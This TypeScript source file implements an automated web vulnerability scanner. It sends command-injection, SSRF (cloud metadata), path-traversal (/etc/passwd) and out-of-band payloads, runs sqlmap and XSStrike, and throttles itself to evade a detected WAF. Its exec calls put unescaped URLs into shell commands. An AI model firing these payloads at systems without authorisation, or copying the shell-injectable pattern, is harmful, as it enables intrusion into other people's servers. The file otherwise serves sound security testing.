import { exec } from 'child_process';
import util from 'util';
import { runDomFuzzer } from './domFuzzer';
import { detectWaf } from './wafDetector';
import { generateOobPayload, checkOobHits } from './oobFuzzer';
import db from './db';
import { v4 as uuidv4 } from 'uuid';

const execAsync = util.promisify(exec);

class WorkerPool {
  private concurrency: number;
  private activeWorkers: number = 0;
  private queue: (() => Promise<void>)[] = [];
  private rateLimitDelayMs: number;
  private lastRequestTime: number = 0;

  constructor(concurrency: number, rateLimitDelayMs: number = 100) {
    this.concurrency = concurrency;
    this.rateLimitDelayMs = rateLimitDelayMs;
  }

  async run<T>(task: () => Promise<T>): Promise<T> {
    return new Promise<T>((resolve, reject) => {
      this.queue.push(async () => {
        try {
          const now = Date.now();
          const timeSinceLastRequest = now - this.lastRequestTime;
          if (timeSinceLastRequest < this.rateLimitDelayMs) {
            await new Promise(r => setTimeout(r, this.rateLimitDelayMs - timeSinceLastRequest));
          }
          this.lastRequestTime = Date.now();

          const result = await task();
          resolve(result);
        } catch (error) {
          reject(error);
        } finally {
          this.activeWorkers--;
          this.processQueue();
        }
      });
      this.processQueue();
    });
  }

  private processQueue() {
    if (this.activeWorkers < this.concurrency && this.queue.length > 0) {
      const task = this.queue.shift();
      if (task) {
        this.activeWorkers++;
        task();
      }
    }
  }
}

export async function runScanner(endpoints: any[], sessionId: string, appUrl: string, targetId: string) {
  const vulnerabilities: any[] = [];
  let pool = new WorkerPool(5, 200); // 5 concurrent workers, 200ms delay
  
  // Check headers of the first endpoint as a proxy for the site
  if (endpoints.length > 0) {
    await pool.run(async () => {
      try {
        const wafResult = await detectWaf(endpoints[0].url);
        if (wafResult.detected) {
          console.log(`[WAF DETECTED] ${wafResult.wafName} detected. Adjusting scan strategy...`);
          pool = new WorkerPool(2, 1000); // Reduce concurrency and increase delay to evade WAF
          
          db.prepare('UPDATE targets SET waf_detected = 1, waf_name = ? WHERE id = ?').run(wafResult.wafName, targetId);

          vulnerabilities.push({
            url: endpoints[0].url,
            type: 'Web Application Firewall (WAF) Detected',
            severity: 'Info',
            confidence: wafResult.confidence,
            explanation: `A Web Application Firewall (${wafResult.wafName || 'Generic'}) was detected protecting the target.`,
            mitigation: 'Ensure WAF rules are properly configured and not blocking legitimate traffic.'
          });
        }

        const res = await fetch(endpoints[0].url, { method: 'HEAD', signal: AbortSignal.timeout(5000) });
        const headers = res.headers;
        
        if (!headers.get('x-frame-options') && !headers.get('content-security-policy')) {
          vulnerabilities.push({
            url: endpoints[0].url,
            type: 'Missing Clickjacking Protection',
            severity: 'Low',
            confidence: 'High',
            explanation: 'The server does not enforce X-Frame-Options or CSP frame-ancestors, leaving it vulnerable to clickjacking.',
            mitigation: 'Add the X-Frame-Options: DENY or SAMEORIGIN header, or implement CSP frame-ancestors.'
          });
        }
        
        const serverHeader = headers.get('server');
        if (serverHeader) {
           vulnerabilities.push({
            url: endpoints[0].url,
            type: 'Server Version Disclosure',
            severity: 'Low',
            confidence: 'Medium',
            explanation: `The server header exposes version information: ${serverHeader}`,
            mitigation: 'Configure the web server to hide its version information.'
          });
        }
      } catch (e) {
        console.error('Scanner error:', e);
      }
    });
  }

  // External Tools Integration (SQLMap & XSStrike) and Active Checks
  const scanPromises = endpoints.map(endpoint => pool.run(async () => {
    if (endpoint.params && endpoint.params.length > 0) {
      const targetUrl = endpoint.url;
      const paramStr = endpoint.params.map((p: string) => `${p}=1`).join('&');
      const fullUrl = `${targetUrl}?${paramStr}`;
      
      // SQLMap Integration
      try {
        // Run SQLMap in batch mode, skipping interactive prompts
        const { stdout } = await execAsync(`sqlmap -u "${fullUrl}" --batch --random-agent --level=1 --risk=1`);
        
        if (stdout.includes('is vulnerable') || stdout.includes('Parameter:')) {
          vulnerabilities.push({
            url: targetUrl,
            type: 'SQL Injection (SQLMap)',
            severity: 'Critical',
            confidence: 'High',
            poc: `sqlmap -u "${fullUrl}" --batch`,
            explanation: 'SQLMap confirmed that the parameter is vulnerable to SQL injection.',
            mitigation: 'Use parameterized queries (Prepared Statements) for all database interactions.'
          });
        }
      } catch (e: any) {
        // Ignore errors if sqlmap is not installed or fails
        console.log(`SQLMap execution skipped or failed for ${targetUrl}:`, e.message);
      }

      // XSStrike Integration
      try {
        // Run XSStrike and output to JSON
        const { stdout } = await execAsync(`xsstrike -u "${fullUrl}" --json`);
        
        try {
          // XSStrike outputs JSON when --json flag is used
          const xsstrikeResults = JSON.parse(stdout);
          if (Array.isArray(xsstrikeResults) && xsstrikeResults.length > 0) {
            for (const result of xsstrikeResults) {
              vulnerabilities.push({
                url: targetUrl,
                type: 'Cross-Site Scripting (XSStrike)',
                severity: 'High',
                confidence: 'High',
                poc: result.payload || `xsstrike -u "${fullUrl}"`,
                explanation: 'XSStrike confirmed that the parameter is vulnerable to XSS.',
                mitigation: 'Implement strict context-aware output encoding and input validation.'
              });
            }
          }
        } catch (parseError) {
          // Fallback if output is not valid JSON but contains vulnerability indicators
          if (stdout.includes('[+] Payload:')) {
             vulnerabilities.push({
              url: targetUrl,
              type: 'Cross-Site Scripting (XSStrike)',
              severity: 'High',
              confidence: 'High',
              poc: `xsstrike -u "${fullUrl}"`,
              explanation: 'XSStrike confirmed that the parameter is vulnerable to XSS.',
              mitigation: 'Implement strict context-aware output encoding and input validation.'
            });
          }
        }
      } catch (e: any) {
        // Ignore errors if xsstrike is not installed or fails
        console.log(`XSStrike execution skipped or failed for ${targetUrl}:`, e.message);
      }

      // Active Checks for RCE and SSRF
      for (const param of endpoint.params) {
        // Log payload attempts
        const logPayload = (payload: string) => {
          try {
            db.prepare('INSERT INTO payload_attempts (id, scan_id, payload) VALUES (?, ?, ?)')
              .run(uuidv4(), sessionId, payload);
          } catch (e) { /* ignore db errors during scan */ }
        };

        // 1. Remote Code Execution (RCE) Check
        const rcePayloads = ['; echo AegisRCE', '| echo AegisRCE', '`echo AegisRCE`', '$(echo AegisRCE)'];
        for (const rcePayload of rcePayloads) {
          logPayload(rcePayload);
          try {
            const rceUrl = new URL(targetUrl);
            rceUrl.searchParams.set(param, rcePayload);
            const rceRes = await fetch(rceUrl.toString(), { signal: AbortSignal.timeout(5000) });
            const rceText = await rceRes.text();
            
            if (rceText.includes('AegisRCE')) {
              vulnerabilities.push({
                url: targetUrl,
                type: 'Remote Code Execution (RCE)',
                severity: 'Critical',
                confidence: 'High',
                poc: rceUrl.toString(),
                explanation: `The server executed the injected command '${rcePayload}' and reflected the output, indicating a critical RCE vulnerability.`,
                mitigation: 'Avoid passing user input directly to system shells. Use safe APIs or strict input validation/sanitization.'
              });
              break; // Stop testing other RCE payloads for this param if one succeeds
            }
          } catch (e) { /* ignore */ }
        }

        // 1b. Blind Remote Code Execution (Time-Based) Check
        const blindRcePayloads = ['; sleep 4', '| sleep 4', '`sleep 4`', '$(sleep 4)', '& ping -n 5 127.0.0.1 &', '| timeout /t 4'];
        for (const blindPayload of blindRcePayloads) {
          try {
            const rceUrl = new URL(targetUrl);
            rceUrl.searchParams.set(param, blindPayload);
            const start = Date.now();
            await fetch(rceUrl.toString(), { signal: AbortSignal.timeout(8000) });
            const duration = Date.now() - start;
            
            if (duration >= 4000) {
              const normalUrl = new URL(targetUrl);
              normalUrl.searchParams.set(param, '1');
              const normalStart = Date.now();
              await fetch(normalUrl.toString(), { signal: AbortSignal.timeout(5000) });
              const normalDuration = Date.now() - normalStart;
              
              if (duration >= normalDuration + 3000) {
                vulnerabilities.push({
                  url: targetUrl,
                  type: 'Blind Remote Code Execution (Time-Based)',
                  severity: 'Critical',
                  confidence: 'High',
                  poc: rceUrl.toString(),
                  explanation: `The server took significantly longer to respond (${duration}ms) when injected with a time-delay command ('${blindPayload}') compared to a normal request (${normalDuration}ms).`,
                  mitigation: 'Avoid passing user input directly to system shells. Use safe APIs or strict input validation/sanitization.'
                });
                break;
              }
            }
          } catch (e) { /* ignore */ }
        }

        // 1c. Blind Remote Code Execution (OOB) Check
        try {
          const { payload: oobRcePayload } = generateOobPayload(sessionId, targetUrl, param, 'RCE', appUrl);
          logPayload(oobRcePayload);
          const oobRceUrl = new URL(targetUrl);
          oobRceUrl.searchParams.set(param, oobRcePayload);
          await fetch(oobRceUrl.toString(), { signal: AbortSignal.timeout(3000) }).catch(() => {});
        } catch (e) { /* ignore */ }

        // 2. Server-Side Request Forgery (SSRF) Check
        const ssrfParams = ['url', 'link', 'src', 'redirect', 'host', 'domain', 'uri'];
        if (ssrfParams.some(p => param.toLowerCase().includes(p))) {
          const ssrfPayloads = ['http://169.254.169.254/latest/meta-data/', 'http://localhost:22'];
          for (const ssrfPayload of ssrfPayloads) {
            logPayload(ssrfPayload);
            try {
              const ssrfUrl = new URL(targetUrl);
              ssrfUrl.searchParams.set(param, ssrfPayload);
              const ssrfRes = await fetch(ssrfUrl.toString(), { signal: AbortSignal.timeout(5000) });
              const ssrfText = await ssrfRes.text();
              
              if (ssrfText.includes('ami-id') || ssrfText.includes('instance-id') || ssrfText.includes('SSH-2.0-')) {
                vulnerabilities.push({
                  url: targetUrl,
                  type: 'Server-Side Request Forgery (SSRF)',
                  severity: 'Critical',
                  confidence: 'High',
                  poc: ssrfUrl.toString(),
                  explanation: `The server fetched the internal resource '${ssrfPayload}' and reflected its content, indicating an SSRF vulnerability.`,
                  mitigation: 'Validate and sanitize all user-supplied URLs and paths. Use an allowlist of permitted domains and block internal IP ranges.'
                });
                break;
              }
            } catch (e) { /* ignore */ }
          }

          // 2b. Blind Server-Side Request Forgery (OOB) Check
          try {
            const { payload: oobSsrfPayload } = generateOobPayload(sessionId, targetUrl, param, 'SSRF', appUrl);
            logPayload(oobSsrfPayload);
            const oobSsrfUrl = new URL(targetUrl);
            oobSsrfUrl.searchParams.set(param, oobSsrfPayload);
            await fetch(oobSsrfUrl.toString(), { signal: AbortSignal.timeout(3000) }).catch(() => {});
          } catch (e) { /* ignore */ }
        }

        // 3. Local File Inclusion (LFI) & Directory Traversal Check
        const lfiParams = ['file', 'page', 'doc', 'dir', 'path', 'include', 'template', 'layout'];
        if (lfiParams.some(p => param.toLowerCase().includes(p))) {
          const lfiPayloads = [
            'file:///etc/passwd',
            '../../../../../../../../etc/passwd',
            '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', // URL Encoded
            '..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd', // Double URL Encoded
            '/etc/passwd',
            'C:\\Windows\\win.ini',
            '..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini'
          ];
          for (const lfiPayload of lfiPayloads) {
            logPayload(lfiPayload);
            try {
              const lfiUrl = new URL(targetUrl);
              lfiUrl.searchParams.set(param, lfiPayload);
              const lfiRes = await fetch(lfiUrl.toString(), { signal: AbortSignal.timeout(5000) });
              const lfiText = await lfiRes.text();
              
              if (lfiText.includes('root:x:0:0:') || lfiText.includes('[extensions]') || lfiText.includes('fonts]')) {
                vulnerabilities.push({
                  url: targetUrl,
                  type: 'Local File Inclusion (LFI) / Directory Traversal',
                  severity: 'Critical',
                  confidence: 'High',
                  poc: lfiUrl.toString(),
                  explanation: `The server included and reflected the contents of a sensitive local file ('${lfiPayload}'), indicating a critical LFI vulnerability.`,
                  mitigation: 'Avoid passing user input directly to filesystem APIs. Use an allowlist of permitted files and strip directory traversal characters (e.g., dot-dot-slash).'
                });
                break;
              }
            } catch (e) { /* ignore */ }
          }

          // 3b. Blind Local File Inclusion (OOB) Check
          try {
            const { payload: oobLfiPayload } = generateOobPayload(sessionId, targetUrl, param, 'LFI', appUrl);
            logPayload(oobLfiPayload);
            const oobLfiUrl = new URL(targetUrl);
            oobLfiUrl.searchParams.set(param, oobLfiPayload);
            await fetch(oobLfiUrl.toString(), { signal: AbortSignal.timeout(3000) }).catch(() => {});
          } catch (e) { /* ignore */ }
        }
      }

      // Dynamic DOM Taint Tracking (Puppeteer)
      try {
        const domFuzzResult = await runDomFuzzer(fullUrl);
        if (domFuzzResult.vulnerabilities.length > 0) {
          vulnerabilities.push(...domFuzzResult.vulnerabilities);
        }
      } catch (e: any) {
        console.error(`DOM Fuzzer failed for ${targetUrl}:`, e.message);
      }
    }
  }));

  await Promise.all(scanPromises);

  // Wait a few seconds for any pending OOB callbacks to arrive
  await new Promise(resolve => setTimeout(resolve, 5000));
  
  // Check for OOB hits
  const oobVulnerabilities = checkOobHits(sessionId);
  vulnerabilities.push(...oobVulnerabilities);

  return vulnerabilities;
}
